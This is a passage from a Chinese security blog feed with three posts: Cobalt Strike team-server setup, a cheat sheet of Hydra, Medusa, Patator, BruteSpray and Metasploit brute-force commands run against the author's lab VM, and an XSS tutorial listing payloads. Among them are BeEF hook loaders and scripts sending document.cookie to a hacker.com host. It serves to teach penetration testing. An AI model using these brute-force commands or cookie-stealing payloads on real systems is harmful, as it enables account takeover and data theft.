href="https://blog.csdn.net/weixin_47830774/article/details/121885329">安装教程2</a></p><p><a href="https://blog.csdn.net/qq_48985780/article/details/121852728">安装教程3</a></p><h2 id="CS安装"><a href="#CS安装" class="headerlink" title="CS安装"></a>CS安装</h2><p>首先CS是需要Java环境才能运行的，不过kali自带Java，所以只要下载Cobalt Strike压缩包，拖到kali里面就可以了。Cobalt Strike在网上有很多下载地址</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203061328524.png" alt="image-20220306132820113"></p><h2 id="CS连接"><a href="#CS连接" class="headerlink" title="CS连接"></a>CS连接</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>下载完Cobalt Strike之后拖到kali里面(用windows来作为服务端的话需要下载一个keytools第三方工具好像，因为之前的CS版本是不支持windows作为服务端的，这里我就不掩饰了)，打开终端cd到Cobalt Strike的目录下输入如下命令即可配置CS的服务端(比如我的kali的IP地址是192.168.29.137，然后随便设置一个连接团队服务器的密码，比如123456)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 192.168.29.137 123456</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203061335848.png" alt="image-20220306133514748"></p><p>这里显示团队服务器的端口在50050，下一行给了一个经过哈希加密的SSL证书，然后再下一行就是监听器jason已经打开，因为我之前已经创建过一个监听器叫jason了，下一次会默认打开该监听器(应该是吧哈哈哈哈哈)</p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>作为客户端打开的话我们需要在linux或者windows中执行如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./start.sh</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203061340339.png" alt="image-20220306134010250"></p><p>因为我这里还是用kali打开客户端，所以host填环回地址就行了，然后端口默认，用户名随便填，密码要填团队服务器的密码(123456),点击connect连接</p><p>第一次连接服务端的话，会提示验证服务器指纹信息(就是服务端创建时提示的经过哈希加密的SSL证书)，确保没有第三方的连接，确认好一致之后点击yes就可以进入到GUI界面了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203061401177.png" alt="image-20220306140137096"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203061346248.png" alt="image-20220306134605085"></p><p>然后我们还可以再用windows来充当第二个客户端来连接团队服务器，只要有java环境，在相同的cobalt strike文件下依旧可以运行，在windows中运行start.bat脚本</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203061355700.png" alt="image-20220306135502532"></p><p>填好host、user和password之后验证指纹，然后就可以进入GUI界面(这里我还把密码忘了…直接报错authentication failure，一定要注意密码是否填写正确)</p><p>如果出现Timeout，就检查一下服务器的端口是否开放</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203061410388.png" alt="image-20220306140932111"></p><p>在事件日志里，各个客户端可以在线聊天，相当于一个团队大厅，还可以显示靶机终端回显的信息，这里John是后面加入的，但是还是可以看到历史记录，这个软件好贴心呜呜呜</p><p>然后可以私信组员，比如john私信neo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/msg neo BBQ</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203061421765.png" alt="image-20220306142115689"></p><p>这里neo可以看到john的私信</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203061422974.png" alt="image-20220306142245860"></p><p>然后可以查看队员的用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/names</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203061424683.png" alt="image-20220306142449633"></p><hr><p>其实CS主要不是用来指导我们在一个团队服务器下进行后攻击渗透的，而是用来在一次行动中使用多个团队服务器，因为如果一个团队服务器崩掉了，所有之前的基础环境都会瓦解</p><h1 id="如何连接更多个服务端"><a href="#如何连接更多个服务端" class="headerlink" title="如何连接更多个服务端"></a>如何连接更多个服务端</h1><p>为了让团队服务器更加稳定和安全，我们需要连接多个服务器，如果要连接新的服务器可以点击左上角Cobalt Strike里面的New Connection</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203061434912.png" alt="image-20220306143404849"></p><p>或者点左上角的加号</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203061439442.png" alt="image-20220306143959385"></p><p>然后填写对应的host、端口和密码就可以连上了，在Cobalt Strike的客户端下面可以选中哪些服务器，还可以重命名</p><p>先到这吧。。以后再更新</p>]]></content>
    
    
    <summary type="html">一起来打CS</summary>
    
    
    
    <category term="Red" scheme="https://jason177.com/categories/Red/"/>
    
    
    <category term="CS" scheme="https://jason177.com/tags/CS/"/>
    
  </entry>
  
  <entry>
    <title>记不住的命令</title>
    <link href="https://jason177.com/2022/03/03/boom/"/>
    <id>https://jason177.com/2022/03/03/boom/</id>
    <published>2022-03-03T13:36:51.000Z</published>
    <updated>2022-03-03T15:11:31.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="记不住呀"><a href="#记不住呀" class="headerlink" title="记不住呀"></a>记不住呀</h1><p>哎！我的记忆力真的不允许我记住这么多命令！！！所以我水一篇文章吧用来记录我那些记不住的命令，嚯嚯嚯</p><h1 id="密码暴力破解"><a href="#密码暴力破解" class="headerlink" title="密码暴力破解"></a>密码暴力破解</h1><p><strong>黑客往往不会破解某一个机器，而是先扫描主机的C段，看有多少台机器是开着并且已经开了相应哪个端口，然后一起暴力破解。</strong>暴力破解分离线和在线，在线意思就是在你网站服务开启的状态下直接爆破，很容易被发现。离线破解就是把密码文件给弄下来，然后用工具对这个文件破解。</p><h2 id="Hydra海德拉"><a href="#Hydra海德拉" class="headerlink" title="Hydra海德拉"></a>Hydra海德拉</h2><p>Hydra几乎支持所有协议的在线密码破解</p><p>添加参数：</p><ul><li>-l：后跟指定的用户名，大写L则表示爆破的用户名文件</li><li>-p：后跟指定的密码，大写P则表示爆破的密码文件</li><li>-o：把破解的账号和密码存放到后面跟着的文件中</li><li>-M：后跟存放主机IP的文件</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Examples:</span><br><span class="line">hydra -l user -P passlist.txt ftp://192.168.0.1      //可以指定是哪个协议</span><br><span class="line">hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN      //可以指定是哪个协议</span><br><span class="line">hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5      //可以指定是哪个协议</span><br><span class="line">hydra -l admin -p password ftp://[192.168.0.0/24]/      //可以指定是哪个协议</span><br><span class="line">hydra -L logins.txt -P pws.txt -M targets.txt ssh      //可以指定是哪个协议</span><br></pre></td></tr></table></figure><p>接下来尝试一下破解我的kali，IP地址是：192.168.29.140,</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203032222271.png" alt="image-20220303222210066"></p><p>可以看到已经破解了远程登录的普通账号kali，但是root账号因为没有设置远程连接，所以破解不了</p><p>把账号密码存到文件中用-o 指定文件名</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203032225763.png" alt="image-20220303222547637"></p><p>如果密码中有空格的话，可以存到文件中，然后在命令模式下输入:set list就可以在后面加一个$符，就可以看到是否有空格了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203032228292.png" alt="image-20220303222810225"></p><h2 id="Medusa美杜莎"><a href="#Medusa美杜莎" class="headerlink" title="Medusa美杜莎"></a>Medusa美杜莎</h2><p>Medusa(美杜莎)是一个速度快，支持大规模并行，模块化，爆破登录。medusa 的稳定性相较于 hydra 要好很多，但 其支持模块要比 hydra 少一些。</p><p>参数：</p><ul><li>-h：目标主机名或者IP地址，大写H表示包含目标主机名称或者IP地址的文件</li><li>-u：测试的用户名，大写U表示包含测试用户名的文件</li><li>-p：测试的密码，大写P表示包含测试密码的文件</li><li>-M：模块执行名称(协议)</li><li>-O：写进指定文件里</li><li>-s：启用SSL</li><li>-t：设定线程数量</li><li>-v：详细级别(0-6)，大V显示版本</li><li>-Z：继续扫描上一次</li><li>-f：在任何主机上找到第一个账号/密码后，停止破解，大写F是在任何主机上找到第一个有效的用户名/密码后停止审计(没看懂啥区别)</li></ul><p>简单尝试了一下，没有设置线程的时候是真滴慢…</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -M ssh -h 192.168.29.137 -U user.txt -P password.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040231348.png" alt="image-20220304023147108"></p><p>如果设置了线程为10的话就会好很多</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -M ssh -h 192.168.29.137 -U user.txt -P password.txt -t 10</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040233324.png" alt="image-20220304023313199"></p><p>设置把破解成功的账号密码写进文件里</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -M ssh -h 192.168.29.137 -U user.txt -P password.txt -O medusa.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040244424.png" alt="image-20220304024458356"></p><p>设置如果有成功的破解案例，页面就暂停下来，当然了，是只有成功了才暂停！不是只显示成功的案例！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -M ssh -h 192.168.29.137 -U user.txt -P password.txt -F</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040239191.png" alt="image-20220304023918128"></p><p>可以看到成功了就会停下来，如果我把正确的账号和密码放在txt文件里的第一位，那就会只会显示成功，后面就会暂停下来不再继续破解</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040240591.png" alt="image-20220304024048525"></p><h2 id="Patator"><a href="#Patator" class="headerlink" title="Patator"></a>Patator</h2><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040252343.png" alt="image-20220304025228247"></p><p>参数：(没有加 - 的参数就是不用加 - )</p><ul><li>user：用户名</li><li>password：密码</li><li>host：主机</li><li>-x：可以忽略某些消息，比如failed</li></ul><p>如果是爆破的话可以用以下方法，用户名和密码定义为一个FILE+名，然后把文件的内容赋值给这个名(讲得好棒棒)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patator ssh_login host=192.168.29.137 user=FILE0 0=user.txt password=FILE1 1=password.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040400694.png" alt="image-20220304040015444"></p><p>如果要忽略爆破错误的内容，就加一个参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patator ssh_login host=192.168.29.137 user=FILE0 0=user.txt password=FILE1 1=password.txt -x ignore:mesg=&#x27;Authentication failed.&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040402056.png" alt="image-20220304040253972"></p><p>注意后面输出的用户名和密码的顺序是看FILE后面加的名字来排序的，如果0和1倒过来，那密码就在前面，用户名在后面</p><h2 id="BrutesPray"><a href="#BrutesPray" class="headerlink" title="BrutesPray"></a>BrutesPray</h2><p>BruteSpray 是一款基于nmap扫描输出的gnmap/XML文件.自动调用Medusa对服务进行爆破(Medusa美杜莎 是一款端口 爆破工具,速度比Hydra九头蛇快)</p><p>参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-f FILE, --file FILE 参数后跟一个文件名, 解析nmap输出的GNMAP或者XML文件</span><br><span class="line">-o OUTPUT, --output OUTPUT 包含成功尝试的目录</span><br><span class="line">-s SERVICE, --service SERVICE 参数后跟一个服务名, 指定要攻击的服务</span><br><span class="line">-t THREADS, --threads THREADS 参数后跟一数值,指定medusa线程数</span><br><span class="line">-T HOSTS, --hosts HOSTS 参数后跟一数值,指定同时测试的主机数</span><br><span class="line">-U USERLIST, --userlist USERLIST 参数后跟用户字典文件</span><br><span class="line">-P PASSLIST, --passlist PASSLIST 参数后跟密码字典文件</span><br><span class="line">-u USERNAME, --username USERNAME 参数后跟用户名,指定一个用户名进行爆破</span><br><span class="line">-p PASSWORD, --password PASSWORD 参数后跟密码,指定一个密码进行爆破</span><br><span class="line">-c, --continuous 成功之后继续爆破</span><br><span class="line">-i, --interactive 交互模式</span><br></pre></td></tr></table></figure><p>然后我们需要用nmap先扫描一下某个主机的网段中都有哪些主机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -v 192.168.106.0/24 -oX nmap.xml  # -v 输出详细信息，-oX 输出xml文件</span><br><span class="line">nmap -A -p22 -v 192.168.106.0/24 -oX 22.xml  # -A 综合扫描 -p 指定端口</span><br><span class="line">nmap –sP 192.168.106.0/24 -oX nmaplive.xml   #-sP ping扫描</span><br><span class="line">nmap -sV –O 192.168.106.0/24 -oX nmap.xml    #-sV 显示版本信息 -O 显示操作系统</span><br></pre></td></tr></table></figure><p>我们就用一个半连接来测试打开了22端口的主机有哪些并且存进brute.xml文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p 22 192.168.29.137/24 -oX brute.xml </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040446321.png" alt="image-20220304044642205"></p><p>然后查看brute.xml，可以看到是xml格式的文件</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040450623.png" alt="image-20220304045049531"></p><p>当然如果想知道被扫的主机有哪些，我们可以过滤一下这个xml文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep 192.168 brute.xml</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040516722.png" alt="image-20220304051603643"></p><p>可以看到除了网关、VMnet8和254外，还剩137，说明我们要扫的主机有192.168.29.137，我们也可以用|wc -l查看有多少行</p><p>接下来开始爆破啦~(<strong>注意，如果要扫很多个主机，一定要加-c！不然成功一次之后就会停止爆破了</strong>)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brutespray --file brute.xml -U user.txt -P password.txt --threads 5 --hosts 5</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040500681.png" alt="image-20220304050012509"></p><p>这时候就显示已经有一对用户名和密码爆破成功了，也可以在上面看到是哪个主机被爆破成功。如果爆破量大的话可以直接看文件，上面显示文件保存在该目录中的brutespray-output文件夹中了。如下可以看到成功爆破的信息</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040502722.png" alt="image-20220304050208668"></p><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p>Metasploit Framework（简称MSF）是一个编写、测试和使用exploit代码的完善环境。这个环境为渗透测试， Shellcode编写和漏洞研究提供了一个可靠的平台，这个框架主要是由面向对象的Perl编程语言编写的，并带有由C语 言，汇编程序和Python编写的可选组件。功能非常强大的一款渗透工具，这里只介绍暴力破解的模块</p><p>打开msfconsole之后可以输入search ssh来查看可使用的模块</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203041429617.png" alt="image-20220304142924645"></p><p>如果想用ssh的枚举模块，则</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_enumusers </span><br><span class="line">msf auxiliary(scanner/ssh/ssh_enumusers) &gt; set rhosts 192.168.29.137  //这里也可以是一个网段</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_enumusers) &gt; set USER_FILE /root/user.txt  //这里还是建议路径不要中文</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_enumusers) &gt; run</span><br></pre></td></tr></table></figure><p>这里有点奇怪。。当我show options查看配置参数的时候发现USER_FILE不是必选项，果然后面测试的时候有问题</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203041504593.png" alt="image-20220304150457463"></p><p>表里的用户名都显示已找到。。。这里的问题有待参考。再试一下版本探测模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/ssh/ssh_enumusers) &gt; use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_version) &gt; set rhosts 192.168.29.137</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_version) &gt; run</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203041508556.png" alt="image-20220304150813460"></p><p>可以看到版本信息，再试试login模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/ssh/ssh_version) &gt; use auxiliary/scanner/ssh/ssh_login</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203041509059.png" alt="image-20220304150935908"></p><p>可以看到配置参数有很多。我们设置rhosts、user_file和pass_file就可以了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set rhosts 192.168.29.137</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set user_file /root/user.txt</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set pass_file /root/password.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203041514321.png" alt="image-20220304151422198"></p><p>可以看到已经破解成功了，用户名和密码都是kali，而且给了一个session 1，可以直接启动会话。</p>]]></content>
    
    
    <summary type="html">真的记不住这些命令所以写篇文章记一下</summary>
    
    
    
    <category term="MISC" scheme="https://jason177.com/categories/MISC/"/>
    
    
    <category term="review" scheme="https://jason177.com/tags/review/"/>
    
  </entry>
  
  <entry>
    <title>XSS</title>
    <link href="https://jason177.com/2022/02/25/xss/"/>
    <id>https://jason177.com/2022/02/25/xss/</id>
    <published>2022-02-25T06:23:04.000Z</published>
    <updated>2022-02-25T09:33:40.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h1><p>XSS(Cross Site Scripting)：跨站脚本攻击，其实跟CSRF，即跨站请求伪造相似却不同。XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户的请求来利用受信任的网站。浏览器的同源策略可以限制跨域请求，但是有些标签(img、iframe、script等)不受同源策略的限制，所以才让XSS有机可乘。<strong>XSS是指攻击者利用网站没有对用户提交的数据进行转义处理或者过滤，进而添在网页上添加一些恶意代码嵌入到web页面中，别的用户访问该页面都会执行相应的代码。</strong>一般来说XSS漏洞只对客户端有影响，不会危害服务器，比如在网页上挂马的话会对该网站访问的用户有危害，因为可以盗取用户的登录信息等等…但是如果该网页具有XSS漏洞，那服务器端也是逃避不了责任的。</p><h1 id="XSS类型："><a href="#XSS类型：" class="headerlink" title="XSS类型："></a>XSS类型：</h1><ol><li>反射型XSS(非持久型)：用户访问带有XSS漏洞的网站A，且访问的链接是包含着一个带XSS攻击向量的网站A的链接(每次攻击都需要用户打开这个链接)，只要用户点击恶意链接的URL时，恶意代码就会在用户主机上的浏览器执行。</li><li>存储型XSS(持久型)：一般是那种留言板或者论坛，XSS攻击代码会存储在网站的服务器中，当页面被用户打开时，服务器就会从数据库中读取然后响应给用户主机，然后用户的浏览器就会执行这段脚本了。</li><li>DOM XSS：客户端的js可以对页面dom节点进行动态的操作，比如插入、修改页面的内容。攻击者构造出特殊的URL、在其中可能包含恶意代码，当用户打开该URL时，用户浏览器收到响应后解析执行。前端使用js取出url中的恶意代码并执行。</li></ol><h1 id="XSS的危害"><a href="#XSS的危害" class="headerlink" title="XSS的危害"></a>XSS的危害</h1><p>1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号 </p><p>2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力 </p><p>3、盗窃企业重要的具有商业价值的资料 </p><p>4、非法转账 </p><p>5、强制发送电子邮件 </p><p>6、网站挂马 </p><p>7、控制受害者机器向其它网站发起攻击</p><h1 id="构造XSS脚本"><a href="#构造XSS脚本" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h1><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><blockquote><p>iframe元素会创建包含另外一个文档的内联框架（即行内框架）。</p><p>textarea标签定义多行的文本输入控件。</p><p>img 元素向网页中嵌入一幅图像。</p><p>script标签用于定义客户端脚本，比如 JavaScript。 script 元素既可以包含脚本语句，也可以通过 src 属性指向外部脚本文件。 必需的 type 属性规定脚本的 MIME 类型。 JavaScript 的常见应用时图像操作、表单验证以及动态内容更新。</p></blockquote><h2 id="常用JS方法"><a href="#常用JS方法" class="headerlink" title="常用JS方法"></a>常用JS方法</h2><blockquote><p>alert alert() 方法用于显示带有一条指定消息和一个 确认 按钮的警告框 </p><p>window.location window.location 对象用于获得当前页面的地址 (URL)，并把浏览器重定向到新的页面。</p><p>location.href 返回当前显示的文档的完整 URL </p><p>onload 一张页面或一幅图像完成加载 </p><p>onsubmit 确认按钮被点击 </p><p>onerror 在加载文档或图像时发生错误</p></blockquote><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">弹框警告</span><br><span class="line">此脚本实现弹框提示，一般作为漏洞测试或者演示使用,类似SQL注入漏洞测试中的单引号<span class="string">&#x27;, 一旦此脚本能执行，也就意</span></span><br><span class="line"><span class="string">味着后端服务器没有对特殊字符做过滤&lt;&gt;/&#x27;</span> 这样就可以证明，这个页面位置存在了XSS漏洞。</span><br><span class="line">&lt;script&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">页面嵌套</span><br><span class="line">&lt;iframe src=http:<span class="comment">//www.baidu.com width=300 height=300&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">http://www.baidu.com</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span> <span class="attr">border</span>=<span class="string">0</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">页面重定向</span><br><span class="line">&lt;script&gt;<span class="built_in">window</span>.location=<span class="string">&quot;http://www.qfedu.com&quot;</span>&lt;/script&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;http://www.baidu.com&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">弹框警告并重定向</span><br><span class="line">&lt;script&gt;alert(<span class="string">&quot;请移步到我们的新站&quot;</span>);location.href=<span class="string">&quot;http://www.qfedu.com&quot;</span>&lt;/script&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>);location.href=<span class="string">&quot;http://10.1.64.35/mutillidae/robots.txt&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">这里结合了一些社工的思路，例如，通过网站内部私信的方式将其发给其他用户。如果其他用户点击并且相信了这个信</span><br><span class="line">息，则可能在另外的站点重新登录账户（克隆网站收集账户）</span><br><span class="line">访问恶意代码</span><br><span class="line">&lt;script src=<span class="string">&quot;http://www.qfedu.com/xss.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://BeEF_IP:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span> #结合BeEF收集用户的cookie</span><br><span class="line">巧用图片标签</span><br><span class="line">&lt;img src=<span class="string">&quot;#&quot;</span> onerror=alert(<span class="string">&#x27;xss&#x27;</span>)&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://BeEF_IP:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span></span><br><span class="line"><span class="xml">绕开过滤的脚本</span></span><br><span class="line"><span class="xml">大小写 <span class="tag">&lt;<span class="name">ScrIpt</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">SCRipt</span>&gt;</span></span></span><br><span class="line"><span class="xml">字符编码 采用URL、Base64等编码</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span></span></span></span><br><span class="line"><span class="tag"><span class="xml"><span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#106;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#118;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span>&amp;#116</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="xml">;<span class="symbol">&amp;#40;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#41;</span>&quot;</span>&gt;</span>yangge<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">收集用户cookie</span></span><br><span class="line"><span class="xml">打开新窗口并且采用本地cookie访问目标网页，打开新窗口并且采用本地cookie访问目标网页。</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&quot;</span>+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">new</span> Image().src=<span 